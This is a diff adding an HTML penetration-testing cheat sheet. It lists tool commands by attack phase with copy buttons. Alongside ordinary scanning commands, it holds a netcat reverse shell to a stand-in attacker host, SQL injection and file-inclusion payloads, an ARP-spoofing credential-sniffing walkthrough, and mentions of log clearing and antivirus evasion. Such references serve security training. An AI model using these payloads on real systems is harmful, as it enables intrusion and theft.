+            <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">nc -lvp 4444 > received_file</code><div class="cmd-desc">Start listener to receive a file or shell.</div></div></div>
+            <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">nc target_ip 4444 < file.txt</code><div class="cmd-desc">Send a file over TCP.</div></div></div>
+            <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">nc -e /bin/bash attacker_ip 4444</code><div class="cmd-desc">Reverse shell: connect back to attacker machine.</div></div></div>
+        </div></details>
+        
+        <details class="tool"><summary>WhatWeb <span class="meta">Web technology fingerprinting</span></summary><div class="content">
+            <div class="tool-purpose">Tool purpose: Identify web technologies including the server, frameworks, and CMS components.</div>
+            <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">whatweb example.com</code><div class="cmd-desc">Identify web server, frameworks, and CMS.</div></div></div>
+            <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">whatweb -v --log-verbose whatweb.log example.com</code><div class="cmd-desc">Verbose logging for later review.</div></div></div>
+            <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">whatweb --aggression 3 example.com</code><div class="cmd-desc">Increase aggression to detect more technologies.</div></div></div>
+        </div></details>
+        
+        <details class="tool"><summary>nikto <span class="meta">Web server scanner</span></summary><div class="content">
+            <div class="tool-purpose">Tool purpose: Scan web servers for thousands of known issues and misconfigurations.</div>
+            <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">nikto -h http://example.com -o nikto_report.txt</code><div class="cmd-desc">Scan web server for known issues and misconfigurations.</div></div></div>
+            <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">nikto -h example.com -Tuning x 1 2 9</code><div class="cmd-desc">Tuning options to skip or include test categories.</div></div></div>
+            <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">nikto -h example.com -ssl -Display V</code><div class="cmd-desc">Force SSL and display verbose output.</div></div></div>
+        </div></details>
+        
+        <details class="tool"><summary>gobuster <span class="meta">Directory/DNS bruteforcing</span></summary><div class="content">
+            <div class="tool-purpose">Tool purpose: Use wordlists to discover hidden directories, files, DNS subdomains, and vhosts.</div>
+            <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">gobuster dir -u http://example.com -w wordlist.txt -o dirs.txt</code><div class="cmd-desc">Directory brute-force using wordlists.</div></div></div>
+            <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">gobuster dns -d example.com -w subdomains.txt -o dns.txt</code><div class="cmd-desc">Subdomain enumeration via DNS bruteforce.</div></div></div>
+            <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">gobuster vhost -u example.com -w vhosts.txt -o vhosts.txt</code><div class="cmd-desc">Virtual host discovery against target.</div></div></div>
+        </div></details>
+        
+        <details class="tool"><summary>dirb <span class="meta">Web content scanner</span></summary><div class="content">
+            <div class="tool-purpose">Tool purpose: A lightweight tool for discovering directories and files against a web root.</div>
+            <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">dirb http://example.com wordlist.txt</code><div class="cmd-desc">Basic directory/file discovery against web root.</div></div></div>
+            <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">dirb http://example.com -x .php,.html -o dirb.txt</code><div class="cmd-desc">Specify extensions and output file.</div></div></div>
+            <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">dirb http://example.com -r</code><div class="cmd-desc">Recursive scan for nested directories.</div></div></div>
+        </div></details>
+        
+        <details class="tool"><summary>wpscan <span class="meta">WordPress scanner</span></summary><div class="content">
+            <div class="tool-purpose">Tool purpose: A targeted scanner for enumerating and finding vulnerabilities in WordPress sites.</div>
+            <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">wpscan --url http://example.com --enumerate p,u</code><div class="cmd-desc">Enumerate plugins and users on WordPress site.</div></div></div>
+            <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">wpscan --url example.com --enumerate vp,tt</code><div class="cmd-desc">Enumerate vulnerable plugins/themes.</div></div></div>
+            <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">wpscan --url example.com --api-token YOUR_TOKEN</code><div class="cmd-desc">Use WPScan API for enhanced vulnerability data.</div></div></div>
+        </div></details>
+        
+        <details class="tool"><summary>Burp Suite <span class="meta">Web analysis tool</span></summary><div class="content">
+            <div class="tool-purpose">Tool purpose: Map endpoints, find parameters, and analyze requests to understand application structure.</div>
+            <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">Target -> Site Map</code><div class="cmd-desc">Shows all endpoints, parameters, and directories found while crawling. Filter by response codes, content types, and methods.</div></div></div>
+        </div></details>
+        
+        <details class="tool"><summary>enum4linux <span class="meta">SMB/Windows enumeration</span></summary><div class="content">
+            <div class="tool-purpose">Tool purpose: Enumerate information from Windows and Samba systems.</div>
+        </div></details>
+        <details class="tool"><summary>ldapsearch <span class="meta">LDAP query tool</span></summary><div class="content">
+            <div class="tool-purpose">Tool purpose: Query LDAP directories to enumerate users, groups, and settings.</div>
+        </div></details>
+      </section>
+
+      <section class="tool-list" id="exploit" style="display:none">
+        <div class="section-purpose">Purpose: Gain initial access by exploiting identified vulnerabilities.</div>
+        
+        <h3 class="attack-title" style="margin-top: 0;">Tools</h3>
+        <details class="tool"><summary>Searchsploit <span class="meta">Local Exploit-DB search</span></summary><div class="content">
+            <div class="tool-purpose">Tool purpose: An offline command-line tool to quickly find public exploits from Exploit-DB.</div>
+            <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">searchsploit apache 2.4.49</code><div class="cmd-desc">Find matching exploits for a specific term or CVE.</div></div></div>
+            <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">sudo searchsploit --update</code><div class="cmd-desc">Refresh local exploit database.</div></div></div>
+            <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">searchsploit --www CVE-2019-0708</code><div class="cmd-desc">Open Exploit-DB pages in browser.</div></div></div>
+            <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">searchsploit --explore <id></code><div class="cmd-desc">View exploit details in pager.</div></div></div>
+            <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">searchsploit -m <id></code><div class="cmd-desc">Copy exploit files to current directory.</div></div></div>
+        </div></details>
+        
+        <details class="tool"><summary>Metasploit <span class="meta">Exploitation framework</span></summary><div class="content">
+            <div class="tool-purpose">Tool purpose: A powerful framework for developing, testing, and executing exploits.</div>
+        </div></details>
+        
+        <details class="tool"><summary>Burp Suite <span class="meta">Web exploitation</span></summary><div class="content">
+            <div class="tool-purpose">Tool purpose: A comprehensive suite for manually testing and exploiting web application vulnerabilities.</div>
+            <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">Proxy</code><div class="cmd-desc">Intercept & modify requests.</div></div></div>
+            <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">Repeater</code><div class="cmd-desc">Manually replay and test requests.</div></div></div>
+            <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">Intruder</code><div class="cmd-desc">Automate brute force and fuzzing attacks.</div></div></div>
+            <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">Decoder</code><div class="cmd-desc">Encode/Decode payloads (Base64, URL, Hex, etc.).</div></div></div>
+        </div></details>
+        
+        <details class="tool"><summary>SQLmap <span class="meta">SQL injection automation</span></summary><div class="content">
+            <div class="tool-purpose">Tool purpose: Automate the process of detecting and exploiting SQL injection flaws.</div>
+        </div></details>
+        <details class="tool"><summary>Hydra <span class="meta">Credential brute force</span></summary><div class="content">
+            <div class="tool-purpose">Tool purpose: A fast, parallelized login cracker that supports numerous protocols.</div>
+        </div></details>
+        
+        <details class="tool"><summary>arpspoof <span class="meta">ARP poisoning (MITM)</span></summary><div class="content">
+            <div class="tool-purpose">Tool purpose: A simple tool for ARP poisoning attacks to perform Man-in-the-Middle.</div>
+            <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">arpspoof -i eth0 -t &lt;victim_IP&gt; &lt;gateway_IP&gt;</code><div class="cmd-desc">Tell the victim you are the gateway.</div></div></div>
+            <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">arpspoof -i eth0 -t &lt;gateway_IP&gt; &lt;victim_IP&gt;</code><div class="cmd-desc">Tell the gateway you are the victim.</div></div></div>
+        </div></details>
+
+        <h3 class="attack-title">Attacks</h3>
+        <details class="tool"><summary>SQL Injection</summary><div class="content">
+            <div class="tool-purpose">Exploiting a web application's database layer by injecting malicious SQL queries.</div>
+            <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">username=admin' OR '1'='1</code><div class="cmd-desc">Login Bypass: Put payload in login form fields to log in without a password.</div></div></div>
+            <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">?id=1' UNION SELECT @@version--</code><div class="cmd-desc">Extract Database Version: Put payload in a URL parameter to show the database version.</div></div></div>
+            <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">?id=1' UNION SELECT table_name, NULL FROM information_schema.tables--</code><div class="cmd-desc">List All Tables: Dumps table names from the database.</div></div></div>
+            <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">?id=1' OR IF(1=1, SLEEP(5), 0)--</code><div class="cmd-desc">Time-Based Blind: If the page delays by 5 seconds, SQL injection is confirmed.</div></div></div>
+        </div></details>
+
+        <details class="tool"><summary>File Inclusion (LFI/RFI)</summary><div class="content">
+            <div class="tool-purpose">Forcing a web application to include a local or remote file that it was not intended to.</div>
+            <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">http://webapp.thm/get.php?file=../../../../etc/passwd</code><div class="cmd-desc">Example of Local File Inclusion (LFI) to read a sensitive system file.</div></div></div>
+        </div></details>
+
+        <details class="tool"><summary>Cross-Site Scripting (XSS)</summary><div class="content">
+            <div class="tool-purpose">Injecting malicious scripts into trusted websites, which then execute in a victim's browser.</div>
+            <div class="attack-desc">
+                <h4>Stored XSS (Persistent)</h4>
+                <p>Payload is saved on the server (e.g., in a comment section or profile) and triggers whenever a victim loads that page.</p>
+                <h4>Reflected XSS (Non-persistent)</h4>
+                <p>Payload is injected in the request (e.g., URL search parameter) and immediately reflected back in the response.</p>
+                <h4>DOM-Based XSS</h4>
+                <p>Payload is executed on the client-side (browser) due to insecure JavaScript code manipulating the DOM, with no server-side reflection needed.</p>
+            </div>
+        </div></details>
+        
+        <details class="tool"><summary>Race Condition</summary><div class="content">
+            <div class="tool-purpose">Exploiting a timing flaw where the system's behavior depends on the sequence or timing of uncontrollable events.</div>
+            <div class="attack-desc">
+                <p>A timing attack where an attacker sends multiple parallel requests to exploit the small window of time before a system updates its state.</p>
+                <p><b>Example (Coupon Abuse):</b> Send parallel "apply coupon" requests to reuse a single-use discount code multiple times before the server can invalidate it.</p>
+            </div>
+        </div></details>
+
+        <details class="tool"><summary>ARP Spoofing Walkthrough (MITM)</summary><div class="content">
+            <div class="tool-purpose">A step-by-step guide to performing a Man-in-the-Middle attack on a local network.</div>
+            <div class="attack-desc">
+                <ol>
+                    <li><b>Identify Targets:</b> Find victim and gateway IP addresses.
+                        <div class="cmd-block" style="margin-top: 8px;"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">nmap -sn 192.168.1.0/24</code></div></div>
+                    </li>
+                    <li><b>Enable IP Forwarding:</b> Allow traffic to flow through the attacker's machine.
+                        <div class="cmd-block" style="margin-top: 8px;"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">echo 1 > /proc/sys/net/ipv4/ip_forward</code></div></div>
+                    </li>
+                    <li><b>Launch ARP Spoofing:</b> Poison the ARP cache of the victim and gateway.
+                        <div class="cmd-block" style="margin-top: 8px;"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">arpspoof -i eth0 -t &lt;victim_IP&gt; &lt;gateway_IP&gt;</code></div></div>
+                    </li>
+                    <li><b>Sniff Traffic:</b> Use tools like Wireshark or bettercap to capture credentials, cookies, and hashes.
+                        <div class="cmd-block" style="margin-top: 8px;"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">bettercap > net.sniff on</code></div></div>
+                    </li>
+                    <li><b>Restore Network (Cleanup):</b> Stop the tools to allow the network to return to normal. Manually restore with `arping` if needed.</li>
+                </ol>
+            </div>
+        </div></details>
+      </section>
+
+      <section class="tool-list" id="post" style="display:none">
+        <div class="section-purpose">Purpose: Escalate privileges and move laterally inside the network.</div>
+        
+        <details class="tool"><summary>linpeas / winpeas <span class="meta">Privilege escalation checks</span></summary><div class="content">
+            <div class="tool-purpose">Tool purpose: Automated scripts that scan for privilege escalation vectors on Linux (linpeas) and Windows (winpeas).</div>
+            <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">wget .../linpeas.sh -O linpeas.sh</code><div class="cmd-desc">Download the latest LinPEAS script from GitHub.</div></div></div>
+            <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">chmod +x linpeas.sh</code><div class="cmd-desc">Give execute permission to the script.</div></div></div>
+            <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">./linpeas.sh</code><div class="cmd-desc">Execute LinPEAS to scan for privilege escalation vectors.</div></div></div>
+            <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">./linpeas.sh > linpeas_output.txt</code><div class="cmd-desc">Save the output to a file for analysis.</div></div></div>
+        </div></details>
+
+        <details class="tool"><summary>BloodHound <span class="meta">Active Directory attack paths</span></summary><div class="content">
+            <div class="tool-purpose">Tool purpose: Visualize Active Directory environments to identify and map attack paths.</div>
+        </div></details>
+        <details class="tool"><summary>Mimikatz <span class="meta">Credential dumping (Windows)</span></summary><div class="content">
+            <div class="tool-purpose">Tool purpose: A post-exploitation tool for extracting plaintext passwords, hashes, and Kerberos tickets from memory on Windows.</div>
+        </div></details>
+        <details class="tool"><summary>PowerSploit <span class="meta">PowerShell post-exploitation</span></summary><div class="content">
+            <div class="tool-purpose">Tool purpose: A collection of PowerShell modules for aiding in all phases of a penetration test.</div>
+        </div></details>
+      </section>
+
+      <section class="tool-list" id="persist" style="display:none">
+        <div class="section-purpose">Purpose: Maintain access to the compromised system and avoid detection.</div>
+        
+        <details class="tool"><summary>netcat <span class="meta">Backdoors & listeners</span></summary><div class="content">
+            <div class="tool-purpose">Tool purpose: Create simple backdoors, listeners, and transfer files for persistent access.</div>
+        </div></details>
+        <details class="tool"><summary>msfvenom <span class="meta">Custom payload creation</span></summary><div class="content">
+            <div class="tool-purpose">Tool purpose: Generate custom payloads for various platforms to establish backdoors and shells.</div>
+        </div></details>
+        <details class="tool"><summary>veil <span class="meta">AV evasion framework</span></summary><div class="content">
+            <div class="tool-purpose">Tool purpose: A framework for generating payloads that bypass common antivirus solutions.</div>
+        </div></details>
+        <details class="tool"><summary>clearev (Metasploit) <span class="meta">Clear event logs</span></summary><div class="content">
+            <div class="tool-purpose">Tool purpose: A Metasploit module used to clear event logs on a compromised Windows machine to cover tracks.</div>
+        </div></details>
+      </section>
+
+      <section class="tool-list" id="report" style="display:none">
+        <div class="section-purpose">Purpose: Present findings, vulnerabilities, and recommendations professionally.</div>
+        
+        <details class="tool"><summary>EyeWitness <span class="meta">Web screenshots</span></summary><div class="content">
+            <div class="tool-purpose">Tool purpose: Automatically capture screenshots of web targets to use in reports.</div>
+            <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">EyeWitness --web -f urls.txt -d /reports/eyewitness</code><div class="cmd-desc">Capture screenshots of web targets from a URL list.</div></div></div>
+            <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">EyeWitness --single http://example.com --no-prompt</code><div class="cmd-desc">Capture a single target without interactive prompts.</div></div></div>
+            <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">EyeWitness --threads 10 -d /reports/ew_batch</code><div class="cmd-desc">Increase parallel threads for faster capture.</div></div></div>
+        </div></details>
+
+        <details class="tool"><summary>tee <span class="meta">Save command output</span></summary><div class="content">
+            <div class="tool-purpose">Tool purpose: Save command output to a file while also viewing it in the terminal.</div>
+            <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">nmap -sV example.com | tee nmap_output.txt</code><div class="cmd-desc">Save nmap output to a file while also printing it to the console.</div></div></div>
+            <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">masscan -p80 example.com | tee masscan.txt</code><div class="cmd-desc">Capture masscan output for later parsing.</div></div></div>
+            <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">command | tee -a combined.log</code><div class="cmd-desc">Append output to a rolling log file.</div></div></div>
+        </div></details>
+        
+        <details class="tool"><summary>grep <span class="meta">Search & filter text</span></summary><div class="content">
+            <div class="tool-purpose">Tool purpose: Search and extract relevant lines or patterns from command outputs and log files.</div>
+            <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">grep -i 'vulnerable' nmap_vuln.txt</code><div class="cmd-desc">Find case-insensitive matches for 'vulnerable' in reports.</div></div></div>
+            <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">grep -Eo '\\b([0-9]{1,3}\\.){3}[0-9]{1,3}\\b' results.txt</code><div class="cmd-desc">Extract IP addresses using regex from a results file.</div></div></div>
+            <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">grep -n 'Admin' eyewitness_report/*</code><div class="cmd-desc">Search for 'Admin' occurrences with line numbers across files.</div></div></div>
+        </div></details>
+        
+        <details class="tool"><summary>awk <span class="meta">Process & reformat text</span></summary><div class="content">
+            <div class="tool-purpose">Tool purpose: A powerful scripting language for processing text fields and reformatting outputs.</div>
+            <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">awk '/open/ {print $1" "$2}' nmap_full.gnmap</code><div class="cmd-desc">Extract fields where 'open' is present and format the output.</div></div></div>
+            <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">cat hosts.txt | awk '{print NR ":" $0}'</code><div class="cmd-desc">Number the lines of a hosts file for review.</div></div></div>
+            <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">awk -F, '{print $1,$3}' findings.csv > summary.txt</code><div class="cmd-desc">Reformat a CSV to a concise summary, printing specific columns.</div></div></div>
+        </div></details>
+
+        <details class="tool"><summary>CherryTree / Obsidian <span class="meta">Note taking</span></summary><div class="content">
+            <div class="tool-purpose">Tool purpose: Structured note-taking applications for organizing findings.</div>
+        </div></details>
+        <details class="tool"><summary>Dradis <span class="meta">Reporting framework</span></summary><div class="content">
+            <div class="tool-purpose">Tool purpose: A collaboration and reporting framework for security teams.</div>
+        </div></details>
+        <details class="tool"><summary>Faraday <span class="meta">Pentest collaboration</span></summary><div class="content">
+            <div class="tool-purpose">Tool purpose: A multi-user Integrated Pentesting Environment for collaboration.</div>
+        </div></details>
+      </section>
+
+    </main>
+  </div>
+
+<script>
+// Phase behavior
+const phaseBtns = document.querySelectorAll('.phase-btn');
+const sections = {
+  recon: document.getElementById('recon'),
+  enum: document.getElementById('enum'),
+  exploit: document.getElementById('exploit'),
+  post: document.getElementById('post'),
+  persist: document.getElementById('persist'),
+  report: document.getElementById('report'),
+};
+function showPhase(id){
+  for(const k in sections){
+    sections[k].style.display = (k===id) ? 'block' : 'none';
+    sections[k].querySelectorAll('details').forEach(d=> d.open=false);
+    sections[k].querySelectorAll('details').forEach(d=> d.style.display='block');
+  }
+  phaseBtns.forEach(b=> b.classList.toggle('active', b.dataset.phase===id));
+  document.getElementById('search').value='';
+  // The problematic line "filter('');" has been removed from here.
+}
+phaseBtns.forEach(b=> b.addEventListener('click', ()=> showPhase(b.dataset.phase)));
+showPhase('recon');
+
+// Search filter
+const search = document.getElementById('search');
+const clear = document.getElementById('clear');
+function filter(q){
+  const ql = q.trim().toLowerCase();
+  
+  if (ql) {
+    phaseBtns.forEach(b=> b.classList.remove('active'));
+  } else if (!document.querySelector('.phase-btn.active')) {
+    document.querySelector('.phase-btn[data-phase="recon"]').classList.add('active');
+  }
+
+  Object.values(sections).forEach(sec=>{
+    let secHasVisibleItems = false;
+    sec.querySelectorAll('details').forEach(d=>{
+      const text = (d.innerText||'').toLowerCase();
+      const isMatch = !ql || text.includes(ql);
+      d.style.display = isMatch ? 'block' : 'none';
+      if (isMatch) secHasVisibleItems = true;
+    });
+
+    sec.querySelectorAll('.attack-title').forEach(title => {
+        title.style.display = secHasVisibleItems ? 'block' : 'none';
+    });
+
+    sec.style.display = secHasVisibleItems || !ql ? 'block' : 'none';
+  });
+}
+search.addEventListener('input', e=> filter(e.target.value));
+clear.addEventListener('click', ()=>{ showPhase('recon'); });
+
+// Copy buttons
+document.addEventListener('click', e=>{
+  const btn = e.target.closest('.copy-left');
+  if(!btn || btn.id==='clear') return;
+  const block = btn.closest('.cmd-block');
+  if(!block) return;
+  const code = block.querySelector('code.cmd');
+  if(!code) return;
+  navigator.clipboard.writeText(code.innerText).then(()=>{
+    const prev = btn.textContent;
+    btn.textContent='Copied';
+    btn.classList.add('copied');
+    setTimeout(()=>{ btn.textContent=prev; btn.classList.remove('copied'); }, 1200);
+  }).catch(()=>{ btn.textContent='Err'; setTimeout(()=> btn.textContent='Copy',1200); });
+});
+
+// Accordion behavior
+document.addEventListener('click', e=>{
+  const summary = e.target.closest('summary');
+  if(!summary) return;
+  e.preventDefault(); 
+  const parentDetails = summary.parentElement;
+  const wasOpen = parentDetails.open;
+  
+  const sec = parentDetails.closest('section');
+  if (sec) {
+    sec.querySelectorAll('details').forEach(d => {
+      d.open = false;
+    });
+  }
+
+  if (!wasOpen) {
+    parentDetails.open = true;
+  }
+});
+</script>
+</body>
+</html>
